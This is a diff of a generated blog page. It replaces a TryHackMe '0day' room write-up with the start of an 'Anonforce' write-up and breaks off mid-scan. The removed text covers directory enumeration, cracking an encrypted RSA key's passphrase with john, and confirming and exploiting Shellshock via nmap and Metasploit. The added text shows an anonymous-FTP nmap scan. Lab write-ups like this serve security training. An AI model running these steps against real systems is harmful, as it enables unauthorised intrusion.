@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>TryHackMe Writeup - 0day Room – g4nd1v</title>
+    <title>TryHackMe Writeup - Anonforce Room – g4nd1v</title>
     
 
 
@@ -653,7 +653,7 @@
     
     var baseurl = JSON.parse("\"https://g4nd1v.github.io\"");
     
-    var permalink = JSON.parse("\"https://g4nd1v.github.io/posts/tryhackme-0day/\"");
+    var permalink = JSON.parse("\"https://g4nd1v.github.io/posts/tryhackme-anonforce/\"");
     
     var langprefix = JSON.parse("\"\"");
     var searchResults = null;
@@ -1331,32 +1331,32 @@
 
 
     
-<meta name="description" content="Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags." />
+<meta name="description" content="boot2root machine for FIT and bsides guatemala CTF" />
 
 
-<meta name="keywords" content="TryHackMe,Shellshock,HashCracking">
+<meta name="keywords" content="TryHackMe,FTP,John-The-Ripper">
 
 <meta name="created" content="2024-02-16T00:00:00&#43;0000">
 <meta name="modified" content="2024-02-16T00:00:00&#43;0000">
 <meta property="article:published_time" content="2024-02-16T00:00:00&#43;0000">
 
 <meta name="author" content="g4nd1v">
-<meta property="article:author" content="https://g4nd1v.github.io/posts/tryhackme-0day/@g4nd1v">
+<meta property="article:author" content="https://g4nd1v.github.io/posts/tryhackme-anonforce/@g4nd1v">
 
 
 <meta property="og:site_name" content="g4nd1v">
-<meta property="og:title" content="TryHackMe Writeup - 0day Room">
-<meta property="og:url" content="https://g4nd1v.github.io/posts/tryhackme-0day/">
+<meta property="og:title" content="TryHackMe Writeup - Anonforce Room">
+<meta property="og:url" content="https://g4nd1v.github.io/posts/tryhackme-anonforce/">
 <meta property="og:type" content="article">
-<meta property="og:description" content="Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.">
+<meta property="og:description" content="boot2root machine for FIT and bsides guatemala CTF">
 
   
-    <meta property="og:image" content="https://g4nd1v.github.io/images/0day/banner.jpeg">
-    <meta property="og:image:url" content="https://g4nd1v.github.io/images/0day/banner.jpeg">
+    <meta property="og:image" content="https://g4nd1v.github.io/images/Anonforce/banner.jpeg">
+    <meta property="og:image:url" content="https://g4nd1v.github.io/images/Anonforce/banner.jpeg">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="g4nd1v">
-    <meta property="twitter:title" content="TryHackMe Writeup - 0day Room">
-    <meta property="twitter:description" content="Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.">
+    <meta property="twitter:title" content="TryHackMe Writeup - Anonforce Room">
+    <meta property="twitter:description" content="boot2root machine for FIT and bsides guatemala CTF">
   
 
 <meta name="generator" content="Hugo 0.112.0">
@@ -1368,7 +1368,7 @@
 
 <meta name="apple-mobile-web-app-status-bar-style" content="#fff">
 
-<link rel="canonical" href="https://g4nd1v.github.io/posts/tryhackme-0day/">
+<link rel="canonical" href="https://g4nd1v.github.io/posts/tryhackme-anonforce/">
 
 <link rel="manifest" href="/manifest.json">
 
@@ -1382,13 +1382,13 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "TryHackMe Writeup - 0day Room",
+    "headline": "TryHackMe Writeup - Anonforce Room",
     "datePublished": "2024-02-16T00:00:00Z",
     "dateModified": "2024-02-16T00:00:00Z",
-    "url" : "https://g4nd1v.github.io/posts/tryhackme-0day/",
-    "description": "Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.",
-    "keywords": ["TryHackMe","Shellshock","HashCracking"],
-    "image" : "https://g4nd1v.github.io/images/0day/banner.jpeg",
+    "url" : "https://g4nd1v.github.io/posts/tryhackme-anonforce/",
+    "description": "boot2root machine for FIT and bsides guatemala CTF",
+    "keywords": ["TryHackMe","FTP","John-The-Ripper"],
+    "image" : "https://g4nd1v.github.io/images/Anonforce/banner.jpeg",
     "author": {
       "@type": "Person",
       "name": "g4nd1v"
@@ -1639,7 +1639,7 @@
   
   <li  class="is-active" >
     
-      <span>TryHackMe Writeup - 0day Room</span>
+      <span>TryHackMe Writeup - Anonforce Room</span>
     
   </li>
   
@@ -1651,14 +1651,14 @@
   <div class="single ">
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
-    <h2 class="single__title" data-ani="true">TryHackMe Writeup - 0day Room</h2>
+    <h2 class="single__title" data-ani="true">TryHackMe Writeup - Anonforce Room</h2>
     <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
 <div class="single__infos">
   <time class="single__info" title="Written At">📅&nbsp;Feb 16, 2024 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;6&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;5&nbsp;min read </span>
   
   &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">👨‍💻&nbsp;g4nd1v</span>
   
@@ -1675,9 +1675,9 @@
 
   <li><a href="https://g4nd1v.github.io/tags/tryhackme/" class="single__tag" title="TryHackMe">#TryHackMe</a></li>
 
-  <li><a href="https://g4nd1v.github.io/tags/shellshock/" class="single__tag" title="Shellshock">#Shellshock</a></li>
+  <li><a href="https://g4nd1v.github.io/tags/ftp/" class="single__tag" title="FTP">#FTP</a></li>
 
-  <li><a href="https://g4nd1v.github.io/tags/hashcracking/" class="single__tag" title="HashCracking">#HashCracking</a></li>
+  <li><a href="https://g4nd1v.github.io/tags/john-the-ripper/" class="single__tag" title="John-The-Ripper">#John-The-Ripper</a></li>
 
 </ul>
 
@@ -1694,207 +1694,38 @@
   <div class="expand__content expand__content--toc">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#user-flag">user flag</a></li>
-    <li><a href="#root-flag">root flag</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#root-flag">Root Flag</a></li>
   </ul>
 </nav>
   </div>
 </div>
 
-      <h1 id="0day">0day</h1>
+      <h1 id="title">Title</h1>
 <table>
 <thead>
 <tr>
 <th>Title</th>
-<th><a href="https://tryhackme.com/room/0day">0day</a></th>
+<th><a href="https://tryhackme.com/room/bsidesgtanonforce">https://tryhackme.com/room/bsidesgtanonforce</a></th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Description</td>
-<td>Exploit Ubuntu, like a Turtle in a Hurricane</td>
+<td>boot2root machine for FIT and bsides guatemala CTF</td>
 </tr>
 <tr>
 <td>Difficulty</td>
-<td>Medium</td>
+<td>Easy</td>
 </tr>
 <tr>
 <td>Maker</td>
-<td><a href="https://tryhackme.com/p/0day">0day</a></td>
+<td><a href="https://tryhackme.com/p/stuxnet">https://tryhackme.com/p/stuxnet</a></td>
 </tr>
 </tbody>
 </table>
-<h2 id="foothold">Foothold</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 5720823c62aa8f4223c0b893996f499c <span class="o">(</span>DSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 4c40db32640d110cef4fb85b739bc76b <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> f76f78d58352a64dda213c5547b72d6d <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a5b4f084b6a78deb0a9d3e7437336516 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: 0day
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>From nmap, we didn&rsquo;t find anything interesting, therefore let&rsquo;s find the directories.</p>
-<pre tabindex="0"><code class="language-shell!" data-lang="shell!">└──╼ $gobuster dir -u 0day.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://0day.thm
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2023/06/12 15:51:58 Starting gobuster in directory enumeration mode
-===============================================================
-/cgi-bin              (Status: 301) [Size: 305] [--&gt; http://0day.thm/cgi-bin/]
-/img                  (Status: 301) [Size: 301] [--&gt; http://0day.thm/img/]
-/uploads              (Status: 301) [Size: 305] [--&gt; http://0day.thm/uploads/]
-/admin                (Status: 301) [Size: 303] [--&gt; http://0day.thm/admin/]
-/css                  (Status: 301) [Size: 301] [--&gt; http://0day.thm/css/]
-/js                   (Status: 301) [Size: 300] [--&gt; http://0day.thm/js/]
-/backup               (Status: 301) [Size: 304] [--&gt; http://0day.thm/backup/]
-/secret               (Status: 301) [Size: 304] [--&gt; http://0day.thm/secret/]
-...
-/cgi-bin              (Status: 301) [Size: 305] [--&gt; http://0day.thm/cgi-bin/]
-...
-</code></pre><p>We get private RSA from <code>/backup</code>, let&rsquo;s crack it using <code>john</code>.</p>
-<pre tabindex="0"><code class="language-shell!" data-lang="shell!">-----BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
-
-T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
-H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
-FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
-Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
-9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
-IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
-SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
-/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
-w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
-6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
-Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
-xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
-8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
-b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
-vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
-wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
-rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
-RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
-oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
-cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
-99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
-Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
-Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
-v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
-gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
------END RSA PRIVATE KEY-----
-</code></pre><pre tabindex="0"><code class="language-shell!" data-lang="shell!">└──╼ $python2 /usr/share/john/ssh2john.py ./rsa_private_key &gt; rsa.hash
-
-└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ./rsa.hash
-...
-letmein          (./rsa_private_key)
-</code></pre><p>Then I tried to login with ssh, but I can&rsquo;t. <strong>Damm it! It&rsquo;s a rabbit hole</strong>.</p>
-<p>I am clueless now, maybe Nikto scan can help.</p>
-<pre tabindex="0"><code class="language-shell!" data-lang="shell!">└──╼ $nikto -h 0day.thm
-- Nikto v2.1.5
----------------------------------------------------------------------------
-+ Target IP:          10.10.152.56
-+ Target Hostname:    0day.thm
-+ Target Port:        80
-+ Start Time:         2023-06-12 16:08:31 (GMT5.5)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.7 (Ubuntu)
-+ Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ &#34;robots.txt&#34; retrieved but it does not contain any &#39;disallow&#39; entries (which is odd).
-+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
-
-+ OSVDB-3092: /admin/: This might be interesting...
-+ OSVDB-3092: /backup/: This might be interesting...
-+ OSVDB-3268: /img/: Directory indexing found.
-+ OSVDB-3092: /img/: This might be interesting...
-+ OSVDB-3092: /secret/: This might be interesting...
-+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
-...
-</code></pre><p>We have checked other files, but this <code>test.cgi</code> is new, after checking that endpoint, in a response it said <code>Hello World!</code>, huh, weird.</p>
-<p>After searching on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi">Hacktricks</a> I tried to test it using nmap.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">└──╼ <span class="nv">$nmap</span> 0day.thm -p <span class="m">80</span> --script<span class="o">=</span>http-shellshock --script-args <span class="nv">uri</span><span class="o">=</span>/cgi-bin/test.cgi
-</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-12 16:21 IST
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 0day.thm <span class="o">(</span>10.10.152.56<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
-</span></span><span class="line"><span class="cl">80/tcp open  http
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-shellshock:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   VULNERABLE:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTP Shellshock vulnerability
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     IDs:  CVE:CVE-2014-6271
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       This web application might be affected by the vulnerability known
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       as Shellshock. It seems the server is executing commands injected
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       via malicious HTTP headers.
-</span></span><span class="line"><span class="cl"><span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Disclosure date: 2014-09-24
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     References:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://seclists.org/oss-sec/2014/q3/685
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6271
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://www.openwall.com/lists/oss-security/2014/09/24/10
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-7169
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Now, we metasploit exploit to get the shell.</p>
-<h2 id="user-flag">user flag</h2>
-<p>using <code>metasploit</code> we can shell.</p>
+<h2 id="nmap">Nmap</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1948,140 +1779,106 @@ letmein          (./rsa_private_key)
 </span><span class="lnt">49
 </span><span class="lnt">50
 </span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; search shellshock
-</span></span><span class="line"><span class="cl">   <span class="c1">#   Name                                               Disclosure Date  Rank       Check  Description</span>
-</span></span><span class="line"><span class="cl">   -   ----                                               ---------------  ----       -----  -----------
-</span></span><span class="line"><span class="cl">   <span class="m">0</span>   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection <span class="o">(</span>Shellshock<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   <span class="m">1</span>   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection <span class="o">(</span>Shellshock<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   <span class="m">2</span>   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection <span class="o">(</span>Shellshock<span class="o">)</span> Scanner
-</span></span><span class="line"><span class="cl">... results ...
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ nmap -sC -sV -oA nmap/anonforce 10.10.57.47   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-21 20:07 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.57.47
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.100s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> bin
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> boot
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x   <span class="m">17</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">3700</span> Feb <span class="m">21</span> 17:04 dev
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x   <span class="m">85</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">13</span>  <span class="m">2019</span> etc
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> home
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lrwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>              <span class="m">33</span> Aug <span class="m">11</span>  <span class="m">2019</span> initrd.img -&gt; boot/initrd.img-4.4.0-157-generic
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lrwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>              <span class="m">33</span> Aug <span class="m">11</span>  <span class="m">2019</span> initrd.img.old -&gt; boot/initrd.img-4.4.0-142-generic
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x   <span class="m">19</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> lib
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> lib64
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwx------    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">16384</span> Aug <span class="m">11</span>  <span class="m">2019</span> lost+found
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">4</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> media
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Feb <span class="m">26</span>  <span class="m">2019</span> mnt
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxrwxrwx    <span class="m">2</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> notread <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> opt
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dr-xr-xr-x  <span class="m">103</span> <span class="m">0</span>        <span class="m">0</span>               <span class="m">0</span> Feb <span class="m">21</span> 17:04 proc
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwx------    <span class="m">3</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> root
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x   <span class="m">18</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">540</span> Feb <span class="m">21</span> 17:04 run
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">12288</span> Aug <span class="m">11</span>  <span class="m">2019</span> sbin
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Aug <span class="m">11</span>  <span class="m">2019</span> srv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dr-xr-xr-x   <span class="m">13</span> <span class="m">0</span>        <span class="m">0</span>               <span class="m">0</span> Feb <span class="m">21</span> 17:04 sys
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Only <span class="m">20</span> shown. Use --script-args ftp-anon.maxlist<span class="o">=</span>-1 to see all.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:10.8.95.227
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; use <span class="m">1</span>
-</span></span><span class="line"><span class="cl">
